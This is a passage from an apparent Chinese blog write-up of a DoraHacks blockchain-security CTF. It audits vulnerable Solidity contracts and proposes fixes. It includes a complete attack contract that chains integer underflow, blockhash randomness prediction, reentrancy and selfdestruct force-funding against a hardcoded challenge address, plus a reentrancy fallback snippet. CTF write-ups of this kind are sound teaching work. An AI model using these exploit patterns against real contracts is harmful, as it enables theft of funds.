uint256(blockhash(block.number-1));\n        uint256 rand = seed / 26959946667150639794667015087019630673637144422540572481103610249216;\n        return rand == guess;\n    }\n    \n    function buyCredit(uint256 guess) public {\n        require(guessRandom(guess));\n        require(balanceOf[msg.sender] >= 10000);\n        require(creditOf[msg.sender] == 0);\n        \n        creditOf[msg.sender] = 1;\n        balanceOf[msg.sender] -= 10000;\n    }\n    \n    function withdrawCredit(uint amount) public{\n        require(creditOf[msg.sender] >= amount);\n        msg.sender.call.value(amount*1000000000)();\n        creditOf[msg.sender] -= amount;\n    }\n    \n    function sendFlag4(string b64email) public {\n        require(creditOf[msg.sender] >= 10000);\n        emit SendFlag(2, b64email);\n    }\n    \n    function getEthBalance() public view returns(uint256){\n        return this.balance;\n    }\n    \n    modifier onlyOwner(){\n        require(msg.sender == owner);\n        _;\n    }\n    function kill(address t) public onlyOwner {\n        selfdestruct(t);\n    }\n}\n```\n\n这题的流程是这样的：\n1. 首先随意`transferBalance()`一下，造成下溢，让balance很大，获得flag3\n2. 绕过随机数预测，成功调用`buyCredit()`，购买信用。\n3. `withdrawCredit()`中依然存在下溢问题，但是require变严格，需要使用重入攻击，在未更新credit时，多取几次。\n4. 上面的攻击遇到一个问题，就是目标合约里没有钱。且目标合约的回调函数没有payable，需要创建另一个合约，selfdestruct后，强制给目标合约转账。\n5. credit下溢后，获得flag4。\n\n攻击合约：\n```\ncontract magic_attack {\n    address owner;\n    string private email = \"OTA3ODg2MDc2QHFxLmNvbQ==\";\n    address private victim = 0x1180e23d7360fc19cf7c7cd26160763b500b158b;\n    uint256 public rand = 0;\n   \n    constructor()public{\n        owner = msg.sender;\n        email = \"OTA3ODg2MDc2QHFxLmNvbQ==\";\n    }\n   \n    function step1() public{\n    \taddress my_to = 0x1180e23d7360fc19cf7c7cd26160763b500b151c;\n    \tuint256 amount = 0x186a0;\n    \tvictim.call(bytes4(keccak256(\"transferBalance(address,uint256)\")),my_to,amount);\n    }\n\n    function step2() public{\n        uint256 seed = uint256(blockhash(block.number-1));\n        rand = seed / 26959946667150639794667015087019630673637144422540572481103610249216;\n    \tvictim.call(bytes4(keccak256(\"buyCredit(uint256)\")),rand);\n    }\n    //在这里，另一个合约自毁。\n    function step3() public{\n    \tvictim.call(bytes4(keccak256(\"withdrawCredit(uint256)\")),1);\n    }\n\n    function () payable public{\n    \tvictim.call(bytes4(keccak256(\"withdrawCredit(uint256)\")),1);\n    }\n\n    function test() public{\n        MagicBank mb = MagicBank(victim);\n\t\tmb.sendFlag4(email);\n    }\n}\n\ncontract bomb {\n    address owner;\n    \n    constructor()public{\n        owner = msg.sender;\n    }\n    \n    function () payable public{}\n\n    function end() public{\n        selfdestruct(0x1180e23d7360fc19cf7c7cd26160763b500b158b);\n    }\n}\n```\n\n\n## 总结\n\n本次比赛天枢获得了第二名的好成绩，与小伙伴们在比赛中的默契配合和平日里老师的指导是息息相关的。\n\n让我总结一下区块链安全的要义，我想说：想象力就是武器。面对区块链和智能合约的题目，只有胆大心细多思考，才能想出完整的攻击链。\n\n现实中，合约、节点、共识算法、钱包、交易所等等，无论哪方面薄弱，都会让黑客有着把货币席卷一空的可能。\n\n就像是在赛事最后分享环节我所说，希望大家在工作中胆大心细，注意好系统的细枝末节，作为安全从业人员，才算真正完成了我们的工作。\n\n\n","slug":"dorahack-blockchain","published":1,"updated":"2020-02-18T07:52:34.146Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck6rlh7th000621vwyf7m39az","content":"<p>早先就对DoraHacks举办的各种hackathon有所耳闻，一直想来参加感受一次，这次很高兴天枢能够受邀参加本场区块链安全比赛，与诸位师傅共同度过一个知性而优雅的周末。各大厂商在周六都分享了许多有意思的思路、或是自家引以为傲的产品和解决方案，开拓了我和小伙伴们的眼界。一下午的展示中收获了良多干货，为第二天的比赛也开拓了思路。</p>\n<p>本次见识到了平时只能在线上看到的诸位大师傅，也有幸享受到了师傅们精心准备的题目，包含了合约审计、漏洞利用、硬件方案、密码学、交易所安全等多个类型，受益良多。也吐槽一句，师傅们颜值都好高呀！</p>\n<p>这里给出Q1、4、11、14、15 我们队的解答。</p>\n<a id=\"more\"></a>\n<h2 id=\"题目wp\"><a href=\"#题目wp\" class=\"headerlink\" title=\"题目wp\"></a>题目wp</h2><h3 id=\"Q1-测试题\"><a href=\"#Q1-测试题\" class=\"headerlink\" title=\"Q1 - 测试题\"></a>Q1 - 测试题</h3><p>主办方提供了四个合约，需要我们给出漏洞点和修复方案，并按要求对某几个合约写出攻击合约。</p>\n<h4 id=\"Auction-sol\"><a href=\"#Auction-sol\" class=\"headerlink\" title=\"Auction.sol\"></a>Auction.sol</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^0.4.10;</span><br><span class=\"line\"></span><br><span class=\"line\">contract Auction &#123;</span><br><span class=\"line\">    address public highestBidder;</span><br><span class=\"line\">    uint256 public highestBid;</span><br><span class=\"line\"></span><br><span class=\"line\">    function Auction(uint256 _highestBid) &#123;</span><br><span class=\"line\">        require(_highestBid &gt; 0);</span><br><span class=\"line\">        // 设置起拍价格        </span><br><span class=\"line\">        highestBid = _highestBid;</span><br><span class=\"line\">        highestBidder = msg.sender;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function bid() payable &#123;</span><br><span class=\"line\">        require(msg.value &gt; highestBid);</span><br><span class=\"line\">        // 退还上一位竞拍者资金</span><br><span class=\"line\">        highestBidder.transfer(highestBid);</span><br><span class=\"line\"></span><br><span class=\"line\">        highestBidder = msg.sender;</span><br><span class=\"line\">        highestBid = msg.value;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 根据区块高度或者时间等，结束拍卖</span><br><span class=\"line\">    function auction_end() &#123;</span><br><span class=\"line\">        // ...</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>很典型的King/拍卖合约，问题出在了出现下一个高价者时，上一个人退款时的transfer()。我们可以构造一个攻击合约，他的回调函数是payable，且函数中revert()或throw。即让我们的攻击合约，作为最高出价者，并且不能接受转账即可。</p>\n<h4 id=\"BankOwned-sol\"><a href=\"#BankOwned-sol\" class=\"headerlink\" title=\"BankOwned.sol\"></a>BankOwned.sol</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract Owned &#123;</span><br><span class=\"line\">    address public owner;</span><br><span class=\"line\">    function Owned() &#123; owner = msg.sender; &#125;</span><br><span class=\"line\">    modifier onlyOwner&#123; if (msg.sender != owner) revert(); _; &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract Bank is Owned &#123;</span><br><span class=\"line\">    address public owner = msg.sender;</span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\">    function transferOwner(address new_owner) public onlyOwner payable &#123;</span><br><span class=\"line\">         owner = new_owner;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function withdraw(uint amount) public onlyOwner &#123;</span><br><span class=\"line\">        require(amount &lt;= this.balance);</span><br><span class=\"line\">        msg.sender.transfer(amount);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这里我认为是继承了Owned()函数，出现了问题，solidity的继承原理是代码拷贝，所有人都可以调用Bank里的Owned函数，但我之后并未调通，希望大家指正这里。</p>\n<h4 id=\"MyContacts-sol\"><a href=\"#MyContacts-sol\" class=\"headerlink\" title=\"MyContacts.sol\"></a>MyContacts.sol</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^0.4.0;</span><br><span class=\"line\"></span><br><span class=\"line\">contract MyContacts &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        struct PersonInfo &#123;</span><br><span class=\"line\">            address person;</span><br><span class=\"line\">            string phoneNumber;</span><br><span class=\"line\">            string note;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">        address private owner;</span><br><span class=\"line\">        </span><br><span class=\"line\">        mapping(address =&gt; PersonInfo) contacts;</span><br><span class=\"line\"></span><br><span class=\"line\">        function MyContacts() &#123;</span><br><span class=\"line\">            owner = msg.sender;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        function addContact(address _person, string _phoneNumber, string _note) public &#123;</span><br><span class=\"line\">            PersonInfo info;</span><br><span class=\"line\">            info.person = _person;</span><br><span class=\"line\">            info.phoneNumber = _phoneNumber;</span><br><span class=\"line\">            info.note = _note;</span><br><span class=\"line\">            contacts[msg.sender] = info;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在函数里声明，会覆盖变量。</p>\n<p>这里举个<a href=\"https://paper.seebug.org/661/\" target=\"_blank\" rel=\"noopener\">启明的文章</a>，方便理解，师傅们在第一天的演讲中也提到了这一点。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity 0.4.24;</span><br><span class=\"line\"></span><br><span class=\"line\">contract test &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    struct aa&#123;</span><br><span class=\"line\">        uint x;</span><br><span class=\"line\">        uint y;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    uint public a = 4;</span><br><span class=\"line\">    uint public b = 6;</span><br><span class=\"line\"></span><br><span class=\"line\">    function test1() returns (uint)&#123;</span><br><span class=\"line\">        aa x;</span><br><span class=\"line\">        x.x = 9;</span><br><span class=\"line\">        x.y = 7;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>函数test1中定义了一个局部结构体变量x，但是没有对其进行初始化。根据solidity的变量存储规则，这时候x是存储在storage中的，而且是从索引0开始，那么对其成员变量x,y赋值之后，刚好覆盖了全局变量a和b。</p>\n<h4 id=\"PrivateBank-sol\"><a href=\"#PrivateBank-sol\" class=\"headerlink\" title=\"PrivateBank.sol\"></a>PrivateBank.sol</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^0.4.15;</span><br><span class=\"line\"></span><br><span class=\"line\">contract PrivateBank &#123;</span><br><span class=\"line\">    mapping (address =&gt; uint) userBalance;</span><br><span class=\"line\">   </span><br><span class=\"line\">    function getBalance(address u) constant returns(uint)&#123;</span><br><span class=\"line\">        return userBalance[u];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function addToBalance() payable&#123;</span><br><span class=\"line\">        userBalance[msg.sender] += msg.value;</span><br><span class=\"line\">    &#125;   </span><br><span class=\"line\"></span><br><span class=\"line\">    function withdrawBalance()&#123;</span><br><span class=\"line\">        if( ! (msg.sender.call.value(userBalance[msg.sender])() ) )&#123;</span><br><span class=\"line\">            throw;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        userBalance[msg.sender] = 0;</span><br><span class=\"line\">    &#125;   </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>看名字都猜出来了，肯定是重入漏洞啦<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msg.sender.call.value(userBalance[msg.sender])()</span><br></pre></td></tr></table></figure></p>\n<p>攻击的话call一下就好了hhh。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">先让攻击合约充一点钱</span><br><span class=\"line\">function () payable public&#123;</span><br><span class=\"line\">    victim.call(bytes4(keccak256(&quot;withdrawBalance()&quot;)));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"Q4-游戏逻辑题，找出三个漏洞\"><a href=\"#Q4-游戏逻辑题，找出三个漏洞\" class=\"headerlink\" title=\"Q4 - 游戏逻辑题，找出三个漏洞\"></a>Q4 - 游戏逻辑题，找出三个漏洞</h3><p>这个题最后只有我们天枢给出了主办方满意的回答，已经在赛后分享和大家讨论过了。</p>\n<p>也是之前在创宇404的时候，和Lorexxar’师傅经常一起审合约，养成的好习惯。很喜欢这道题，出题的师傅说，请大家把它仅仅当作游戏合约来看待，而不是蜜罐之类的hh。我还蛮喜欢这种心态的。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^0.4.0;</span><br><span class=\"line\"></span><br><span class=\"line\">// Bet Game</span><br><span class=\"line\">contract BetGame &#123;</span><br><span class=\"line\">\taddress owner;\t\t\t\t\t                // 合约持有者</span><br><span class=\"line\">\tmapping(address =&gt; uint256) public balanceOf;\t// 用户资金集</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tuint256 public cutOffBlockNumber;\t\t        // 下注截止到cutOffBlockNumber,至少有1000个块的距离到创建合约的块</span><br><span class=\"line\">\tuint256 public status; \t\t\t\t            // 状态，根据每次下注修改状态</span><br><span class=\"line\">\tmapping(address =&gt; uint256) public positiveSet;\t// 赌注正面赢: status == 1</span><br><span class=\"line\">\tmapping(address =&gt; uint256) public negativeSet;\t// 赌注反面赢: status == 0</span><br><span class=\"line\">\tuint256 public positiveBalance;\t\t\t        // 正面下注资金总额</span><br><span class=\"line\">\tuint256 public negativeBalance;\t\t\t        // 反面下注资金总额</span><br><span class=\"line\"></span><br><span class=\"line\">\tmodifier isOwner &#123;</span><br><span class=\"line\">\t\tassert(owner == msg.sender);</span><br><span class=\"line\">\t\t_;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tmodifier isRunning &#123;</span><br><span class=\"line\">\t\tassert(block.number &lt; cutOffBlockNumber);</span><br><span class=\"line\">\t\t_;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tmodifier isStop &#123;</span><br><span class=\"line\">\t\tassert(block.number &gt;= cutOffBlockNumber);</span><br><span class=\"line\">\t\t_;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tconstructor(uint256 _cutOffBlockNumber) public &#123;</span><br><span class=\"line\">\t\towner = msg.sender;\t\t\t</span><br><span class=\"line\">\t\tbalanceOf[owner] = 100000000000;</span><br><span class=\"line\">        cutOffBlockNumber = _cutOffBlockNumber;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfunction transfer(address to, uint256 value) public returns (bool success) &#123;</span><br><span class=\"line\">    \trequire(balanceOf[msg.sender] &gt;= value);</span><br><span class=\"line\">    \trequire(balanceOf[to] + value &gt;= balanceOf[to]);</span><br><span class=\"line\">    \tbalanceOf[msg.sender] -= value;</span><br><span class=\"line\">    \tbalanceOf[to] += value;</span><br><span class=\"line\">    \treturn true;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t// 下注并影响状态，该操作必须在赌局结束之前</span><br><span class=\"line\">\tfunction bet(uint256 value, bool positive) isRunning public returns(bool success) &#123;</span><br><span class=\"line\">\t\trequire(balanceOf[msg.sender] &gt;= value);</span><br><span class=\"line\">\t\tbalanceOf[msg.sender] -= value;</span><br><span class=\"line\">\t\tif (positive == true) &#123;</span><br><span class=\"line\">\t\t\tpositiveSet[msg.sender] += value;</span><br><span class=\"line\">\t\t\tpositiveBalance += value;</span><br><span class=\"line\">\t\t&#125; else &#123;</span><br><span class=\"line\">\t\t\tnegativeSet[msg.sender] += value;</span><br><span class=\"line\">\t\t\tnegativeBalance += value;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tbytes32 result = keccak256(abi.encodePacked(blockhash(block.number), msg.sender, block.timestamp));</span><br><span class=\"line\">\t\tuint8 flags = (uint8)(result &amp; 0xFF);\t// 取一个字节，根据值的大小决定状态</span><br><span class=\"line\">\t\tif (flags &gt; 128) &#123;</span><br><span class=\"line\">\t\t\tstatus = 1;</span><br><span class=\"line\">\t\t&#125; else &#123;</span><br><span class=\"line\">\t\t\tstatus = 0;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\treturn true;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t// 猜对就取回成本和猜对所得（猜错将不能取回成本），该操作必须在赌局结束以后</span><br><span class=\"line\">\tfunction withdraw() isStop public returns (bool success)&#123;</span><br><span class=\"line\">\t\tuint256 betBalance;</span><br><span class=\"line\">\t\tuint256 reward;</span><br><span class=\"line\">\t\tif (status == 1) &#123; // positiveSet</span><br><span class=\"line\">\t\t\tbetBalance = positiveSet[msg.sender];</span><br><span class=\"line\">\t\t\tif (betBalance &gt; 0) &#123;</span><br><span class=\"line\">\t\t\t    balanceOf[msg.sender] += betBalance;</span><br><span class=\"line\">\t\t\t\tpositiveSet[msg.sender] -= betBalance;</span><br><span class=\"line\">\t\t\t\tpositiveBalance -= betBalance;</span><br><span class=\"line\">\t\t\t\treward = (betBalance * negativeBalance) / positiveBalance;</span><br><span class=\"line\">\t\t\t\tnegativeBalance -= reward;</span><br><span class=\"line\">\t\t\t\tbalanceOf[msg.sender] += reward;</span><br><span class=\"line\">\t\t\t&#125; </span><br><span class=\"line\">\t\t&#125; else if (status == 0) &#123;</span><br><span class=\"line\">\t\t\tbetBalance = negativeSet[msg.sender];</span><br><span class=\"line\">\t\t\tif (betBalance &gt; 0) &#123;</span><br><span class=\"line\">\t\t\t    balanceOf[msg.sender] += betBalance;</span><br><span class=\"line\">\t\t\t\tnegativeSet[msg.sender] -= betBalance;</span><br><span class=\"line\">\t\t\t\tnegativeBalance -= betBalance;</span><br><span class=\"line\">\t\t\t\treward = (betBalance * positiveBalance) / negativeBalance;</span><br><span class=\"line\">\t\t\t\tpositiveBalance -= reward;</span><br><span class=\"line\">\t\t\t\tbalanceOf[msg.sender] += reward;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\treturn true;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>不按审合约正确的套路写了，这里给出我的答案，前三个是师傅的预期解。</p>\n<h4 id=\"随机数分布不均\"><a href=\"#随机数分布不均\" class=\"headerlink\" title=\"随机数分布不均\"></a>随机数分布不均</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if (flags &gt; 128) &#123;</span><br><span class=\"line\">    status = 1;</span><br><span class=\"line\">&#125; else &#123;</span><br><span class=\"line\">    status = 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>正:反 = 129:127</p>\n<h4 id=\"发奖金时逻辑有误\"><a href=\"#发奖金时逻辑有误\" class=\"headerlink\" title=\"发奖金时逻辑有误\"></a>发奖金时逻辑有误</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">negativeSet[msg.sender] -= betBalance;</span><br><span class=\"line\">negativeBalance -= betBalance;</span><br><span class=\"line\">reward = (betBalance * positiveBalance) / negativeBalance;</span><br></pre></td></tr></table></figure>\n<p>应该先计算reward，再变动参数，目前这样会导致用户多领款。</p>\n<h4 id=\"游戏时长设计不合理\"><a href=\"#游戏时长设计不合理\" class=\"headerlink\" title=\"游戏时长设计不合理\"></a>游戏时长设计不合理</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">modifier isRunning &#123;</span><br><span class=\"line\">    assert(block.number &lt; cutOffBlockNumber);</span><br><span class=\"line\">    _;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">modifier isStop &#123;</span><br><span class=\"line\">    assert(block.number &gt;= cutOffBlockNumber);</span><br><span class=\"line\">    _;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">constructor(uint256 _cutOffBlockNumber) public &#123;</span><br><span class=\"line\">    owner = msg.sender;\t\t\t</span><br><span class=\"line\">    balanceOf[owner] = 100000000000;</span><br><span class=\"line\">    cutOffBlockNumber = _cutOffBlockNumber;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>我感觉这个算是设计的不好，好在提交的时候提到了构造函数的问题，经师傅锦囊指点，给出了正确解答。这里的设计非常奇怪，我们常见的游戏合约，都是设计游戏时长，这个却设计的是输入截断高度。当合约部署时输入错误，会导致游戏不开始or永远无法结束。给出这样的设计更好：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">require(游戏长度&gt; 1000 and 游戏长度&lt;10000);</span><br><span class=\"line\">cutOffBlockNumber = block.number + 游戏长度;</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"随机数的熵源\"><a href=\"#随机数的熵源\" class=\"headerlink\" title=\"随机数的熵源\"></a>随机数的熵源</h4><p>虽然没有较完美的随机数生成方案，但这里有个大问题hh<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bytes32 result = keccak256(abi.encodePacked(blockhash(block.number), msg.sender, block.timestamp));</span><br></pre></td></tr></table></figure></p>\n<p>区块未生成的情况下，<code>blockhash(block.number)</code>恒为0，借secbit的师傅的话：</p>\n<blockquote>\n<p>常见不安全的“随机数”计算方法，会读取当前块的前一个块的哈希 block.blockhash(block.number-1) 作为随机源。而在合约内执行 block.blockhash(block.number) 返回值为 0。我们无法在合约内获得当前区块的哈希，这是因为矿工打包并执行交易时，当前区块哈希尚未被算出。因此，我们可以认为“当前区块”哈希是“未来”的，无法预测。</p>\n</blockquote>\n<h4 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h4><ul>\n<li>solidity版本过低</li>\n<li>上个safemath库，不过这个合约上下溢处理的都ok</li>\n</ul>\n<h3 id=\"Q11-密码学RSA\"><a href=\"#Q11-密码学RSA\" class=\"headerlink\" title=\"Q11 - 密码学RSA\"></a>Q11 - 密码学RSA</h3><p>这题是小伙伴HWHong做的，师傅web渗透一把手，密码学也超厉害！</p>\n<p>明文:<code>something_for_nothing</code></p>\n<p>思路赛后在群里已经有了，大体是可以看到n2可分解为多个素数，只有一个密文，说明n1是加密用的n，n2是hint。</p>\n<p>因为n1，n2高位相同，假设:</p>\n<ul>\n<li>n1 = p1 * q1</li>\n<li>n2 = (p1 + a) * (q1 + b)</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span 